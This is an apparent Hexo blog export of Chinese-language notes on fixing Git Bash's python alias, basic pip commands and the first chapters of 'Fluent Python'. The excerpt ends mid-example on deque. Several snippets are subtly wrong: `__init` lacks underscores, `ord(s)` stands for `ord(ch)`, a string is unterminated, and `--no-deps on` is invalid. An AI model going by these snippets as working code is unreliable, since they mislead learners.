    <content><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>编辑 <code>C:\Program Files\Git\etc\profile.d\aliases.sh</code>，将<code>python2.7</code>改成<code>python</code><br><img src="/2023/06/26/2023-06-26-win-git-bash-fail-due-to-python/image1.png"><br>编辑完成后，重启git bash, 输入python即可</p>
<span id="more"></span>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ofreelander/article/details/112058975">https://blog.csdn.net/ofreelander/article/details/112058975</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Win</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>pip基础用法示例</title>
    <url>/2023/05/25/2023-05-25-pip-basic-usage/</url>
    <content><![CDATA[<h2 id="配置国内源"><a href="#配置国内源" class="headerlink" title="配置国内源"></a>配置国内源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host = https://pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>

<h2 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install XXX              # 最新版本</span><br><span class="line">pip install XXX==1.0.4       # 指定版本</span><br><span class="line">pip install XXX&gt;=1.0.4       # 最低版本</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="卸载包"><a href="#卸载包" class="headerlink" title="卸载包"></a>卸载包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip uninstall XXX</span><br></pre></td></tr></table></figure>

<h2 id="查看某个已安装包的信息"><a href="#查看某个已安装包的信息" class="headerlink" title="查看某个已安装包的信息"></a>查看某个已安装包的信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip show XXX    # 查看信息</span><br><span class="line">pip show -f XXX # 查看详细信息</span><br></pre></td></tr></table></figure>

<h2 id="列出所有已安装的包"><a href="#列出所有已安装的包" class="headerlink" title="列出所有已安装的包"></a>列出所有已安装的包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip list</span><br></pre></td></tr></table></figure>

<h2 id="查看本地某个wheel包的依赖"><a href="#查看本地某个wheel包的依赖" class="headerlink" title="查看本地某个wheel包的依赖"></a>查看本地某个wheel包的依赖</h2><p>例：使用pkginfo命令查看kubernetes-26.1.0-py2.py3-none-any.whl的依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pkginfo</span><br><span class="line">/usr/local/python3/bin/pkginfo kubernetes-26.1.0-py2.py3-none-any.whl</span><br><span class="line"></span><br><span class="line">metadata_version: 2.1</span><br><span class="line">name: kubernetes</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">requires_python: &gt;=3.6</span><br><span class="line">requires_dist: [&#x27;certifi (&gt;=14.05.14)&#x27;, &#x27;six (&gt;=1.9.0)&#x27;, &#x27;python-dateutil (&gt;=2.5.3)&#x27;, &#x27;setuptools (&gt;=21.0.0)&#x27;, &#x27;pyyaml (&gt;=5.4.1)&#x27;, &#x27;google-auth (&gt;=1.0.1)&#x27;, &#x27;websocket-client (!=0.40.0,!=0.41.*,!=0.42.*,&gt;=0.32.0)&#x27;, &#x27;requests&#x27;, &#x27;requests-oauthlib&#x27;, &#x27;urllib3 (&gt;=1.24.2)&#x27;, &#x27;ipaddress (&gt;=1.0.17) ; python_version==&quot;2.7&quot;&#x27;, &quot;adal (&gt;=1.0.2) ; extra == &#x27;adal&#x27;&quot;]</span><br><span class="line">provides_extras: [&#x27;adal&#x27;]</span><br></pre></td></tr></table></figure>

<h2 id="只下载某个包到本地，不安装"><a href="#只下载某个包到本地，不安装" class="headerlink" title="只下载某个包到本地，不安装"></a>只下载某个包到本地，不安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<p>如果不想下载这个包的依赖，使用–no-deps选项，用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes --no-deps on -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>

<h2 id="离线安装，通过requirements-txt指定要安装的包"><a href="#离线安装，通过requirements-txt指定要安装的包" class="headerlink" title="离线安装，通过requirements.txt指定要安装的包"></a>离线安装，通过requirements.txt指定要安装的包</h2><ol start="0">
<li>新增requirements.txt，内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psutil</span><br><span class="line">supervisor</span><br><span class="line">kubernetes</span><br></pre></td></tr></table></figure></li>
<li>下载安装包到本地<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download -d $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
<li>离线安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install --no-index --find-links $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>流畅的Python 笔记</title>
    <url>/2023/07/19/2023-07-19-fluent-python-note/</url>
    <content><![CDATA[<h2 id="第一章：Python数据类型"><a href="#第一章：Python数据类型" class="headerlink" title="第一章：Python数据类型"></a>第一章：Python数据类型</h2><h3 id="x20-为什么需要特殊方法"><a href="#x20-为什么需要特殊方法" class="headerlink" title="&#x20;为什么需要特殊方法"></a>&#x20;为什么需要特殊方法</h3><span id="more"></span>

<p>在类中定义特殊方法的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyObj</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.L)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">self</span>.L[index]</span><br><span class="line"></span><br><span class="line">o = MyObj()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len: &#x27;</span>, <span class="built_in">len</span>(o))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;L[1]: , o[1])</span></span><br></pre></td></tr></table></figure>

<p>特殊方法存在是为了被Python解释器调用的，自己并不需要调用，比如说不应使用my<em>obj.__len__()，而应该使用len(myobj)</em></p>
<h3 id="随机返回某个元素"><a href="#随机返回某个元素" class="headerlink" title="随机返回某个元素"></a>随机返回某个元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line">choice(o)   <span class="comment"># o = MyObj()</span></span><br></pre></td></tr></table></figure>

<h3 id="使用特殊方法实现一个Vector类"><a href="#使用特殊方法实现一个Vector类" class="headerlink" title="使用特殊方法实现一个Vector类"></a>使用特殊方法实现一个Vector类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> hypot</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__abs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> hypot(<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bool__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(<span class="built_in">abs</span>(<span class="variable language_">self</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Vector(%r, %r)&quot;</span> % (<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.x + other.x</span><br><span class="line">        y = <span class="variable language_">self</span>.y + other.y</span><br><span class="line">        <span class="keyword">return</span> Vector(x, y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, scalar</span>):</span><br><span class="line">        <span class="keyword">return</span> Vector(<span class="variable language_">self</span>.x * scalar, <span class="variable language_">self</span>.y * scalar)</span><br></pre></td></tr></table></figure>

<ul>
<li>Python有一个内置的函数叫repr，它能把一个对象用字符串形式表达式以便辨认</li>
<li>通过add和mul函数，支持+和*运算</li>
<li>默认情况，自定义类实例总为真，除非这个类对bool有自己的实现</li>
</ul>
<h3 id="特殊方法一览"><a href="#特殊方法一览" class="headerlink" title="特殊方法一览"></a>特殊方法一览</h3><p><a href="https://docs.python.org/3/reference/datamodel.html">3. Data model — Python 3.11.4 documentation</a></p>
<h3 id="x20-为什么len不是普通方法"><a href="#x20-为什么len不是普通方法" class="headerlink" title="&#x20;为什么len不是普通方法"></a>&#x20;为什么len不是普通方法</h3><p>为了让Python自带的数据结构可以走后门，abs也是同理，但多亏了它是特殊方法，可以把len用于自定义数据类型</p>
<h3 id="x20-本章小结"><a href="#x20-本章小结" class="headerlink" title="&#x20;本章小结"></a>&#x20;本章小结</h3><ul>
<li>通过特殊方法，自定义数据类型可以表现得跟内置类型一样，从而写出更具表达力的代码</li>
<li>Python对象的基本要求就是它得有合理的字符串表示形式，可以通过repr和str满足这个要求，前者方便调试日志，后者给终端用户看(print)</li>
</ul>
<h2 id="第二章：序列构成的数组"><a href="#第二章：序列构成的数组" class="headerlink" title="第二章：序列构成的数组"></a>第二章：序列构成的数组</h2><h3 id="学会使用列表推导，增强代码可读性"><a href="#学会使用列表推导，增强代码可读性" class="headerlink" title="学会使用列表推导，增强代码可读性"></a>学会使用列表推导，增强代码可读性</h3><p>例：把一个字符串变成Unicode代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">symbols = <span class="string">&#x27;abcdefg&#x27;</span></span><br><span class="line">codes = [ <span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> symbols <span class="keyword">if</span> <span class="built_in">ord</span>(s) &gt; <span class="number">100</span>]</span><br><span class="line"><span class="built_in">print</span>(codes)</span><br><span class="line">[<span class="number">101</span>,<span class="number">102</span>,<span class="number">103</span>]</span><br></pre></td></tr></table></figure>

<p>例：笛卡尔积</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;white&#x27;</span>]</span><br><span class="line">sizes = [<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;L&#x27;</span>]</span><br><span class="line">tshirts = [(color,size) <span class="keyword">for</span> color <span class="keyword">in</span> colors <span class="keyword">for</span> size <span class="keyword">in</span> sizes ]</span><br><span class="line"><span class="built_in">print</span>(tshirts)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[(<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;S&#x27;</span>), (<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;M&#x27;</span>), (<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;L&#x27;</span>), (<span class="string">&#x27;whi</span></span><br><span class="line"><span class="string">te&#x27;</span>, <span class="string">&#x27;S&#x27;</span>), (<span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;M&#x27;</span>), (<span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;L&#x27;</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="x20-生成器表达式"><a href="#x20-生成器表达式" class="headerlink" title="&#x20;生成器表达式"></a>&#x20;生成器表达式</h3><p>生成器表达式可以逐个产生元素，而不是先建立一个完整列表，这种方式更加节省内存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">symbols = <span class="string">&#x27;abcdefg&#x27;</span></span><br><span class="line"><span class="built_in">tuple</span>(<span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> symbols <span class="keyword">if</span> <span class="built_in">ord</span>(s) &gt; <span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<h3 id="元组不仅是不可变列表，还可用于没有字段名的记录"><a href="#元组不仅是不可变列表，还可用于没有字段名的记录" class="headerlink" title="元组不仅是不可变列表，还可用于没有字段名的记录"></a>元组不仅是不可变列表，还可用于没有字段名的记录</h3><p>元组拆包</p>
<h3 id="使用collections-namedtuple构建简单类"><a href="#使用collections-namedtuple构建简单类" class="headerlink" title="使用collections.namedtuple构建简单类"></a>使用collections.namedtuple构建简单类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Card = collections.namedtuple(<span class="string">&#x27;Card&#x27;</span>, \[<span class="string">&#x27;rank&#x27;</span>, <span class="string">&#x27;list&#x27;</span>]) beer\_card = Card(<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;diamonds&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="对象切片"><a href="#对象切片" class="headerlink" title="对象切片"></a>对象切片</h3><p>可以用s[a: b: c]形式对a和b之间以c为间隔取值，c的值可以为负，负值意味着反向取值。下面3个例子更直观些</p>
<p>c为负值意味着可以反向取值，举例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;bicycle&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;bye&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;elcycib&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;eccb&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="切片操作对序列做修改"><a href="#切片操作对序列做修改" class="headerlink" title="切片操作对序列做修改"></a>切片操作对序列做修改</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">2</span>:<span class="number">5</span>] = [<span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> l[<span class="number">5</span>:<span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<h3 id="对序列使用-和"><a href="#对序列使用-和" class="headerlink" title="对序列使用+和*"></a>对序列使用+和*</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">board = [[<span class="string">&#x27;_&#x27;</span>] * <span class="number">3</span>] * <span class="number">3</span></span><br><span class="line">board = [[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]]</span><br><span class="line">board[<span class="number">1</span>][<span class="number">2</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">board</span><br><span class="line">[[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>]]</span><br></pre></td></tr></table></figure>

<h3 id="序列的增量赋值-x20"><a href="#序列的增量赋值-x20" class="headerlink" title="序列的增量赋值&#x20;"></a>序列的增量赋值&#x20;</h3><p>+&#x3D; 背后特殊方法是iadd，如果一个类没实现这种方法就回退一步调用add, 比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a += b</span><br></pre></td></tr></table></figure>

<ul>
<li>如果a实现了iadd，就会调用iadd，a就会就地改动； 如果a没实现iadd，a +&#x3D; b这个表达式效果和a &#x3D; a + b一样</li>
</ul>
<h3 id="对不可变序列做拼接操作"><a href="#对不可变序列做拼接操作" class="headerlink" title="对不可变序列做拼接操作"></a>对不可变序列做拼接操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(t)</span><br><span class="line"><span class="number">1737687416128</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t *= <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(t)</span><br><span class="line"><span class="number">1737687389568</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ID发生了变化，对不可变序列进行重复拼接操作效率低，因为每次都有一个新对象，解释器需把原来对象中元素先复制到新对象，再追加新元素</li>
<li>str是一个例外，str做+&#x3D;，id不一定会变，因为CPython做了优化，str初始化时会留额外的可扩展空间，做增量操作时不一定会复制原有字符串到新位置到这类操作</li>
</ul>
<h3 id="关于-的谜题"><a href="#关于-的谜题" class="headerlink" title="关于+&#x3D;的谜题"></a>关于+&#x3D;的谜题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,<span class="number">2</span>,[<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>] += [<span class="number">50</span>,<span class="number">60</span>]</span><br><span class="line">TypeError: <span class="string">&#x27;tuple&#x27;</span> obj does <span class="keyword">not</span> support item assignment</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, [<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">60</span>])</span><br></pre></td></tr></table></figure>

<p>教训：不要把可变对象放在元组里，增量赋值并非完整操作</p>
<h3 id="list-sort方法和内置函数sorted"><a href="#list-sort方法和内置函数sorted" class="headerlink" title="list.sort方法和内置函数sorted"></a>list.sort方法和内置函数sorted</h3><ul>
<li>list.sort方法就地排序列表, sorted总是返回一个列表</li>
<li>两种方法都有两个可选的关键字参数<ul>
<li>reverse 如果被设定为True，降序输出</li>
<li>key，默认用元素自己的值做排序</li>
</ul>
</li>
<li>是稳定排序，每次排序结果相对位置固定的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits = [<span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits)</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, reverse=<span class="literal">True</span>)</span><br><span class="line">[<span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, key=<span class="built_in">len</span>)</span><br><span class="line">[<span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, key=<span class="built_in">len</span>, reverse=<span class="literal">True</span>)</span><br><span class="line">[<span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="bisect操作（排序，插入已排序的序列）"><a href="#bisect操作（排序，插入已排序的序列）" class="headerlink" title="bisect操作（排序，插入已排序的序列）"></a>bisect操作（排序，插入已排序的序列）</h3><p>插入已排序的序列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> bisect</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bisect.insort(a, <span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure>
<h3 id="array数组"><a href="#array数组" class="headerlink" title="array数组"></a>array数组</h3><ul>
<li><p>如需要一个只包含数字的列表, array.array比list更高效</p>
</li>
<li><p>数组支持所有可变序列相关操作，包括pop, insert, extend</p>
</li>
<li><p>数组提供从文件读取和存入文件的快速方法，如frombytes, tofile</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats = array(<span class="string">&#x27;d&#x27;</span>, (random() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats[-<span class="number">1</span>]</span><br><span class="line"><span class="number">0.5225102971704024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp = <span class="built_in">open</span>(<span class="string">&#x27;floats.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats.tofile(fp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2 = array(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp = <span class="built_in">open</span>(<span class="string">&#x27;floats.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2.fromfile(fp, <span class="number">10</span>**<span class="number">7</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2[-<span class="number">1</span>]</span><br><span class="line"><span class="number">0.5225102971704024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2 == floats</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>tofile和fromfile速度比从文本文件读快60多倍，原因是后者使用内置的float把每一行文字转成浮点数</p>
</li>
<li><p>另一个快速序列化数字类型方法是使用pickle，速度和array相当，但pickle可以处理几乎所有的内置数字类型，包含复数、嵌套集合，用户自定义类</p>
</li>
</ul>
<h3 id="x20-内存视图"><a href="#x20-内存视图" class="headerlink" title="&#x20;内存视图"></a>&#x20;内存视图</h3><p><code>memoryview</code>是一个内置类，能让用户在不复制内容情况下操作同一个数组的不同切片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> array</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers = array.array(<span class="string">&#x27;h&#x27;</span>, [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv = <span class="built_in">memoryview</span>(numbers)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(memv)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv[<span class="number">0</span>]</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct = memv.cast(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct.tolist()</span><br><span class="line">[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct[<span class="number">3</span>] = <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers</span><br><span class="line">array(<span class="string">&#x27;h&#x27;</span>, [-<span class="number">1</span>, <span class="number">1024</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3 id="NumPy-和-SciPy"><a href="#NumPy-和-SciPy" class="headerlink" title="NumPy 和 SciPy"></a>NumPy 和 SciPy</h3><ul>
<li>NumPy提供高阶数组和矩阵操作, SciPy是基于NumPy的库，提供科学计算有关算法</li>
</ul>
<h3 id="双向队列和其他形式的队列"><a href="#双向队列和其他形式的队列" class="headerlink" title="双向队列和其他形式的队列"></a>双向队列和其他形式的队列</h3><p>collections.deque类是一个线程安全，可以快速从两端添加或删除元素的数据类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(<span class="built_in">range</span>(<span class="number">10</span>), maxlen=<span class="number">10</span>) ➊</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.rotate(<span class="number">3</span>) ➋</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.rotate(-<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.appendleft(-<span class="number">1</span>) 